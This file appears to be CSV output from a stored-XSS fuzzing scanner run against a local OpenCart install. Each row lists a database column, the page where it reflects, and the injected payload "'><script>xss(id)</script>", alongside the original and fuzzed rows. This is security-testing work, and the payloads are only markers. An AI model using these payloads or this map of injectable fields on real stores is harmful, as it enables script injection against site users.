web app,DB source,reflection sink,id,payload,description
opencart,oc_information_description.title,http://localhost/,936811,"""'><script>xss(936811)</script>","
            opencart.oc_information_description.title[2][2]
            original row: [3, 1, 'Privacy Policy', '&lt;p&gt;\r\n\tPrivacy Policy&lt;/p&gt;\r\n', 'Privacy Policy', '', '']
            fuzzed row: [3, 1, '""\'><script>xss(936811)</script>', '&lt;p&gt;\r\n\tPrivacy Policy&lt;/p&gt;\r\n', 'Privacy Policy', '', '']
            change: 'Privacy Policy' => '""'><script>xss(936811)</script>'
            
fuzzed after scan 104 / 625
found as XSS in scan 105 / 625"
opencart,oc_banner_image.title,http://localhost/,937418,"""'><script>xss(937418)</script>","
            opencart.oc_banner_image.title[12][3]
            original row: [97, 8, 1, 'Starbucks', '', 'catalog/demo/manufacturer/starbucks.png', 0]
            fuzzed row: [97, 8, 1, '""\'><script>xss(937418)</script>', '', 'catalog/demo/manufacturer/starbucks.png', 0]
            change: 'Starbucks' => '""'><script>xss(937418)</script>'
            
fuzzed after scan 615 / 625
found as XSS in scan 616 / 625"
opencart,oc_category_description.name,http://localhost/,940152,"""'><script>xss(940152)</script>","
            opencart.oc_category_description.name[8][2]
            original row: [29, 1, 'Mice and Trackballs', '', 'Mice and Trackballs', '', '']
            fuzzed row: [29, 1, '""\'><script>xss(940152)</script>', '', 'Mice and Trackballs', '', '']
            change: 'Mice and Trackballs' => '""'><script>xss(940152)</script>'
            
fuzzed after scan 7 / 625
found as XSS in scan 8 / 625"
opencart,oc_category_description.name,http://localhost/,946337,"""'><script>xss(946337)</script>","
            opencart.oc_category_description.name[28][2]
            original row: [49, 1, 'test 17', '', 'test 17', '', '']
            fuzzed row: [49, 1, '""\'><script>xss(946337)</script>', '', 'test 17', '', '']
            change: 'test 17' => '""'><script>xss(946337)</script>'
            
fuzzed after scan 7 / 625
found as XSS in scan 8 / 625"
opencart,oc_banner_image.title,http://localhost/,948870,"""'><script>xss(948870)</script>","
            opencart.oc_banner_image.title[11][3]
            original row: [96, 8, 1, 'Sony', '', 'catalog/demo/manufacturer/sony.png', 0]
            fuzzed row: [96, 8, 1, '""\'><script>xss(948870)</script>', '', 'catalog/demo/manufacturer/sony.png', 0]
            change: 'Sony' => '""'><script>xss(948870)</script>'
            
fuzzed after scan 615 / 625
found as XSS in scan 616 / 625"
opencart,oc_category_description.name,http://localhost/,949966,"""'><script>xss(949966)</script>","
            opencart.oc_category_description.name[4][2]
            original row: [25, 1, 'Components', '', 'Components', '', '']
            fuzzed row: [25, 1, '""\'><script>xss(949966)</script>', '', 'Components', '', '']
            change: 'Components' => '""'><script>xss(949966)</script>'
            
fuzzed after scan 7 / 625
found as XSS in scan 8 / 625"
opencart,oc_category_description.name,http://localhost/,950790,"""'><script>xss(950790)</script>","
            opencart.oc_category_description.name[24][2]
            original row: [45, 1, 'Windows', '', 'Windows', '', '']
            fuzzed row: [45, 1, '""\'><script>xss(950790)</script>', '', 'Windows', '', '']
            change: 'Windows' => '""'><script>xss(950790)</script>'
            
fuzzed after scan 7 / 625
found as XSS in scan 8 / 625"
opencart,oc_banner_image.link,http://localhost/,955936,"""'><script>xss(955936)</script>","
            opencart.oc_banner_image.link[3][4]
            original row: [88, 8, 1, 'Harley Davidson', '', 'catalog/demo/manufacturer/harley.png', 0]
            fuzzed row: [88, 8, 1, 'Harley Davidson', '""\'><script>xss(955936)</script>', 'catalog/demo/manufacturer/harley.png', 0]
            change: '' => '""'><script>xss(955936)</script>'
            
fuzzed after scan 616 / 625
found as XSS in scan 617 / 625"
opencart,oc_category_description.name,http://localhost/,956977,"""'><script>xss(956977)</script>","
            opencart.oc_category_description.name[25][2]
            original row: [46, 1, 'Macs', '', 'Macs', '', '']
            fuzzed row: [46, 1, '""\'><script>xss(956977)</script>', '', 'Macs', '', '']
            change: 'Macs' => '""'><script>xss(956977)</script>'
            
fuzzed after scan 7 / 625
found as XSS in scan 8 / 625"
opencart,oc_category_description.name,http://localhost/,957196,"""'><script>xss(957196)</script>","
            opencart.oc_category_description.name[22][2]
            original row: [43, 1, 'test 11', '', 'test 11', '', '']
            fuzzed row: [43, 1, '""\'><script>xss(957196)</script>', '', 'test 11', '', '']
            change: 'test 11' => '""'><script>xss(957196)</script>'
            
fuzzed after scan 7 / 625
found as XSS in scan 8 / 625"
opencart,oc_information_description.title,http://localhost/,958025,"""'><script>xss(958025)</script>","
            opencart.oc_information_description.title[0][2]
            original row: [1, 1, 'About Us', '&lt;p&gt;\r\n\tAbout Us&lt;/p&gt;\r\n', 'About Us', '', '']
            fuzzed row: [1, 1, '""\'><script>xss(958025)</script>', '&lt;p&gt;\r\n\tAbout Us&lt;/p&gt;\r\n', 'About Us', '', '']
            change: 'About Us' => '""'><script>xss(958025)</script>'
            
fuzzed after scan 104 / 625
found as XSS in scan 105 / 625"
opencart,oc_product_description.name,http://localhost/,959331,"""'><script>xss(959331)</script>","
            opencart.oc_product_description.name[2][2]
            original row: [30, 1, 'Canon EOS 5D', ""&lt;p&gt;\r\n\tCanon's press material for the EOS 5D states that it 'defines (a) new D-SLR category', while we're not typically too concerned with marketing talk this particular statement is clearly pretty accurate. The EOS 5D is unlike any previous digital SLR in that it combines a full-frame (35 mm sized) high resolution sensor (12.8 megapixels) with a relatively compact body (slightly larger than the EOS 20D, although in your hand it feels noticeably 'chunkier'). The EOS 5D is aimed to slot in between the EOS 20D and the EOS-1D professional digital SLR's, an important difference when compared to the latter is that the EOS 5D doesn't have any environmental seals. While Canon don't specifically refer to the EOS 5D as a 'professional' digital SLR it will have obvious appeal to professionals who want a high quality digital SLR in a body lighter than the EOS-1D. It will also no doubt appeal to current EOS 20D owners (although lets hope they've not bought too many EF-S lenses...) äë&lt;/p&gt;\r\n"", '', 'sdf', '', '']
            fuzzed row: [30, 1, '""\'><script>xss(959331)</script>', ""&lt;p&gt;\r\n\tCanon's press material for the EOS 5D states that it 'defines (a) new D-SLR category', while we're not typically too concerned with marketing talk this particular statement is clearly pretty accurate. The EOS 5D is unlike any previous digital SLR in that it combines a full-frame (35 mm sized) high resolution sensor (12.8 megapixels) with a relatively compact body (slightly larger than the EOS 20D, although in your hand it feels noticeably 'chunkier'). The EOS 5D is aimed to slot in between the EOS 20D and the EOS-1D professional digital SLR's, an important difference when compared to the latter is that the EOS 5D doesn't have any environmental seals. While Canon don't specifically refer to the EOS 5D as a 'professional' digital SLR it will have obvious appeal to professionals who want a high quality digital SLR in a body lighter than the EOS-1D. It will also no doubt appeal to current EOS 20D owners (although lets hope they've not bought too many EF-S lenses...) äë&lt;/p&gt;\r\n"", '', 'sdf', '', '']
            change: 'Canon EOS 5D' => '""'><script>xss(959331)</script>'
            
fuzzed after scan 200 / 625
found as XSS in scan 201 / 625"
opencart,oc_information_description.title,http://localhost/,961267,"""'><script>xss(961267)</script>","
            opencart.oc_information_description.title[1][2]
            original row: [2, 1, 'Terms &amp; Conditions', '&lt;p&gt;\r\n\tTerms &amp;amp; Conditions&lt;/p&gt;\r\n', 'Terms &amp; Conditions', '', '']
            fuzzed row: [2, 1, '""\'><script>xss(961267)</script>', '&lt;p&gt;\r\n\tTerms &amp;amp; Conditions&lt;/p&gt;\r\n', 'Terms &amp; Conditions', '', '']
            change: 'Terms &amp; Conditions' => '""'><script>xss(961267)</script>'
            
fuzzed after scan 104 / 625
found as XSS in scan 105 / 625"
opencart,oc_category_description.name,http://localhost/,961345,"""'><script>xss(961345)</script>","
            opencart.oc_category_description.name[34][2]
            original row: [55, 1, 'test 23', '', 'test 23', '', '']
            fuzzed row: [55, 1, '""\'><script>xss(961345)</script>', '', 'test 23', '', '']
            change: 'test 23' => '""'><script>xss(961345)</script>'
            
fuzzed after scan 7 / 625
found as XSS in scan 8 / 625"
opencart,oc_setting.value,"http://localhost/new_admin/index.php?route=common/dashboard&user_token=36754fb83d2a620f99cc30c6bf69119
http://localhost/new_admin/index.php?route=common/forgotten
http://localhost/new_admin/index.php?route=common/login",961939,"""'><script>xss(961939)</script>","
            opencart.oc_setting.value[14][4]
            original row: [15, 0, 'config', 'config_language_admin', 'en-gb', 0]
            fuzzed row: [15, 0, 'config', 'config_language_admin', '""\'><script>xss(961939)</script>', 0]
            change: 'en-gb' => '""'><script>xss(961939)</script>'
            
fuzzed after scan 353 / 625
found as XSS in scan 354 / 625"
opencart,oc_category_description.name,http://localhost/,962026,"""'><script>xss(962026)</script>","
            opencart.oc_category_description.name[9][2]
            original row: [30, 1, 'Printers', '', 'Printers', '', '']
            fuzzed row: [30, 1, '""\'><script>xss(962026)</script>', '', 'Printers', '', '']
            change: 'Printers' => '""'><script>xss(962026)</script>'
            
fuzzed after scan 7 / 625
found as XSS in scan 8 / 625"
opencart,oc_category_description.name,http://localhost/,963588,"""'><script>xss(963588)</script>","
            opencart.oc_category_description.name[11][2]
            original row: [32, 1, 'Web Cameras', '', 'Web Cameras', '', '']
            fuzzed row: [32, 1, '""\'><script>xss(963588)</script>', '', 'Web Cameras', '', '']
            change: 'Web Cameras' => '""'><script>xss(963588)</script>'
            
fuzzed after scan 7 / 625
found as XSS in scan 8 / 625"
opencart,oc_category_description.name,http://localhost/,963870,"""'><script>xss(963870)</script>","
            opencart.oc_category_description.name[23][2]
            original row: [44, 1, 'test 12', '', 'test 12', '', '']
            fuzzed row: [44, 1, '""\'><script>xss(963870)</script>', '', 'test 12', '', '']
            change: 'test 12' => '""'><script>xss(963870)</script>'
            
fuzzed after scan 7 / 625
found as XSS in scan 8 / 625"
opencart,oc_setting.value,http://localhost/,965662,"""'><script>xss(965662)</script>","
            opencart.oc_setting.value[7][4]
            original row: [8, 0, 'config', 'config_meta_keyword', '', 0]
            fuzzed row: [8, 0, 'config', 'config_meta_keyword', '""\'><script>xss(965662)</script>', 0]
            change: '' => '""'><script>xss(965662)</script>'
            
fuzzed after scan 353 / 625
found as XSS in scan 354 / 625"
opencart,oc_banner_image.link,http://localhost/,966899,"""'><script>xss(966899)</script>","
            opencart.oc_banner_image.link[10][4]
            original row: [95, 8, 1, 'RedBull', '', 'catalog/demo/manufacturer/redbull.png', 0]
            fuzzed row: [95, 8, 1, 'RedBull', '""\'><script>xss(966899)</script>', 'catalog/demo/manufacturer/redbull.png', 0]
            change: '' => '""'><script>xss(966899)</script>'
            
fuzzed after scan 616 / 625
found as XSS in scan 617 / 625"
opencart,oc_banner_image.link,http://localhost/,967625,"""'><script>xss(967625)</script>","
            opencart.oc_banner_image.link[4][4]
            original row: [89, 8, 1, 'Dell', '', 'catalog/demo/manufacturer/dell.png', 0]
            fuzzed row: [89, 8, 1, 'Dell', '""\'><script>xss(967625)</script>', 'catalog/demo/manufacturer/dell.png', 0]
            change: '' => '""'><script>xss(967625)</script>'
            
fuzzed after scan 616 / 625
found as XSS in scan 617 / 625"
opencart,oc_category_description.name,http://localhost/,968681,"""'><script>xss(968681)</script>","
            opencart.oc_category_description.name[17][2]
            original row: [38, 1, 'test 4', '', 'test 4', '', '']
            fuzzed row: [38, 1, '""\'><script>xss(968681)</script>', '', 'test 4', '', '']
            change: 'test 4' => '""'><script>xss(968681)</script>'
            
fuzzed after scan 7 / 625
found as XSS in scan 8 / 625"
opencart,oc_category_description.name,http://localhost/,969012,"""'><script>xss(969012)</script>","
            opencart.oc_category_description.name[13][2]
            original row: [34, 1, 'MP3 Players', '&lt;p&gt;\r\n\tShop Laptop feature only the best laptop deals on the market. By comparing laptop deals from the likes of PC World, Comet, Dixons, The Link and Carphone Warehouse, Shop Laptop has the most comprehensive selection of laptops on the internet. At Shop Laptop, we pride ourselves on offering customers the very best laptop deals. From refurbished laptops to netbooks, Shop Laptop ensures that every laptop - in every colour, style, size and technical spec - is featured on the site at the lowest possible price.&lt;/p&gt;\r\n', 'MP3 Players', '', '']
            fuzzed row: [34, 1, '""\'><script>xss(969012)</script>', '&lt;p&gt;\r\n\tShop Laptop feature only the best laptop deals on the market. By comparing laptop deals from the likes of PC World, Comet, Dixons, The Link and Carphone Warehouse, Shop Laptop has the most comprehensive selection of laptops on the internet. At Shop Laptop, we pride ourselves on offering customers the very best laptop deals. From refurbished laptops to netbooks, Shop Laptop ensures that every laptop - in every colour, style, size and technical spec - is featured on the site at the lowest possible price.&lt;/p&gt;\r\n', 'MP3 Players', '', '']
            change: 'MP3 Players' => '""'><script>xss(969012)</script>'
            
fuzzed after scan 7 / 625
found as XSS in scan 8 / 625"
opencart,oc_category_description.name,http://localhost/,972068,"""'><script>xss(972068)</script>","
            opencart.oc_category_description.name[3][2]
            original row: [24, 1, 'Phones &amp; PDAs', '', 'Phones &amp; PDAs', '', '']
            fuzzed row: [24, 1, '""\'><script>xss(972068)</script>', '', 'Phones &amp; PDAs', '', '']
            change: 'Phones &amp; PDAs' => '""'><script>xss(972068)</script>'
            
fuzzed after scan 7 / 625
found as XSS in scan 8 / 625"
opencart,oc_category_description.name,http://localhost/,972669,"""'><script>xss(972669)</script>","
            opencart.oc_category_description.name[26][2]
            original row: [47, 1, 'test 15', '', 'test 15', '', '']
            fuzzed row: [47, 1, '""\'><script>xss(972669)</script>', '', 'test 15', '', '']
            change: 'test 15' => '""'><script>xss(972669)</script>'
            
fuzzed after scan 7 / 625
found as XSS in scan 8 / 625"
opencart,oc_category_description.name,http://localhost/,973126,"""'><script>xss(973126)</script>","
            opencart.oc_category_description.name[0][2]
            original row: [17, 1, 'Software', '', 'Software', '', '']
            fuzzed row: [17, 1, '""\'><script>xss(973126)</script>', '', 'Software', '', '']
            change: 'Software' => '""'><script>xss(973126)</script>'
            
fuzzed after scan 7 / 625
found as XSS in scan 8 / 625"
opencart,oc_category_description.name,http://localhost/,974477,"""'><script>xss(974477)</script>","
            opencart.oc_category_description.name[18][2]
            original row: [39, 1, 'test 6', '', 'test 6', '', '']
            fuzzed row: [39, 1, '""\'><script>xss(974477)</script>', '', 'test 6', '', '']
            change: 'test 6' => '""'><script>xss(974477)</script>'
            
fuzzed after scan 7 / 625
found as XSS in scan 8 / 625"
opencart,oc_banner_image.link,http://localhost/,975231,"""'><script>xss(975231)</script>","
            opencart.oc_banner_image.link[13][4]
            original row: [98, 8, 1, 'Nintendo', '', 'catalog/demo/manufacturer/nintendo.png', 0]
            fuzzed row: [98, 8, 1, 'Nintendo', '""\'><script>xss(975231)</script>', 'catalog/demo/manufacturer/nintendo.png', 0]
            change: '' => '""'><script>xss(975231)</script>'
            
fuzzed after scan 616 / 625
found as XSS in scan 617 / 625"
